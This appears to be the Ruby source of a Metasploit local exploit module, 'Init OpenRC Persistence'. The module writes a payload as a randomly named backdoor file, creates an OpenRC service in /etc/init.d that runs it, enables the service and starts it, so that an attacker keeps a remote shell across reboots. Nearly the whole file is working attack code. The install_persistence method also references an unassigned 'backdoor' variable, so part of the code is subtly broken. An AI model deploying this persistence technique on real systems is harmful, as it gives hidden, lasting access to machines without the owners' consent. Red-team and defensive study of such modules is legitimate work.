##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Persistence
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/linux/local/service_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Init OpenRC Persistence',
        'Description' => %q{
          This module will create a service on the box via OpenRC, and mark it for auto-restart.
          We need enough access to write service files and potentially restart services
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die',
        ],
        'Platform' => ['unix', 'linux'],
        'Targets' => [
          ['Automatic', {}]
        ],
        'DefaultTarget' => 0,
        'Arch' => ARCH_CMD,
        'References' => [
          ['URL', 'https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples'],
          ['URL', 'https://attack.mitre.org/techniques/T1543/'],
          ['URL', 'https://wiki.alpinelinux.org/wiki/Writing_Init_Scripts'],
          ['URL', 'https://wiki.alpinelinux.org/wiki/OpenRC'],
          ['URL', 'https://github.com/OpenRC/openrc/blob/master/service-script-guide.md'],
        ],
        'Payload' => {
          'Compat' =>
          {
            'PayloadType' => 'cmd',
            'RequiredCmd' => 'python netcat' # we need non-threaded/forked so the systems properly detect the service going down
          }
        },
        'SessionTypes' => ['shell', 'meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        },
        'DisclosureDate' => '2007-04-05' # openrc release date
      )
    )

    register_options(
      [
        # OptPath.new('BACKDOOR_PATH', [true, 'Writable path to put our shell', '/usr/local/bin']), -> WritableDir
        OptString.new('SHELL_NAME', [false, 'Name of shell file to write']),
        OptString.new('SERVICE', [false, 'Name of service to create'])
      ]
    )
    register_advanced_options(
      [
        OptBool.new('EnableService', [true, 'Enable the service', true])
      ]
    )
  end

  def check
    return CheckCode::Safe("#{datastore['WritableDir']} doesnt exist") unless exists?(datastore['WritableDir'])
    return CheckCode::Safe("#{datastore['WritableDir']} isnt writable") unless writable?(datastore['WritableDir'])
    return CheckCode::Safe("/etc/init.d/ doesnt exist") unless exists?('/etc/init.d/')
    return CheckCode::Safe("/etc/init.d/ isnt writable") unless writable?('/etc/init.d/')

    return CheckCode::Safe('Likely not an openrc based system') unless command_exists?('openrc')
    CheckCode::Appears("#{datastore['WritableDir']} is writable and openrc based")
  end

  def install_persistence
    write_shell(datastore['WritableDir'])

    path = backdoor.split('/')[0...-1].join('/')
    file = backdoor.split('/')[-1]

    openrc(path, file)
  end

  def write_shell(path)
    file_name = datastore['SHELL_NAME'] || Rex::Text.rand_text_alpha(5)
    backdoor = "#{path}/#{file_name}"
    vprint_status("Writing backdoor to #{backdoor}")
    write_file(backdoor, payload.encoded)
    @clean_up_rc << "rm #{backdoor}\n"

    if file_exist?(backdoor)
      cmd_exec("chmod 711 #{backdoor}")
      return backdoor
    end
    fail_with(Failure::NoAccess, 'File not written, check permissions.')
  end

  def openrc(backdoor_path, backdoor_file)
    script = %(#!/sbin/openrc-run
name=#{backdoor_file}
command=/bin/sh
command_args="#{backdoor_path}/#{backdoor_file}"
pidfile="/run/${RC_SVCNAME}.pid"
command_background="yes"
)

    service_filename = datastore['SERVICE'] || Rex::Text.rand_text_alpha(7..12)
    service_path = "/etc/init.d/#{service_filename}"
    vprint_status("Writing service: #{service_path}")
    begin
      upload_and_chmodx(service_path, script)
      @clean_up_rc << "rm #{service_path}\n"
    rescue Rex::Post::Meterpreter::RequestError
      print_error("Writing '#{service_path}' to the target and or changing the file permissions failed")
    end

    unless file_exist?(service_path)
      print_error('File not written, check permissions.')
      return
    end

    if datastore['EnableService']
      vprint_status('Enabling service')
      cmd_exec("rc-update add '#{service_filename}'")
    end

    print_good('Starting service')
    cmd_exec("'#{service_path}' start")
  end
end
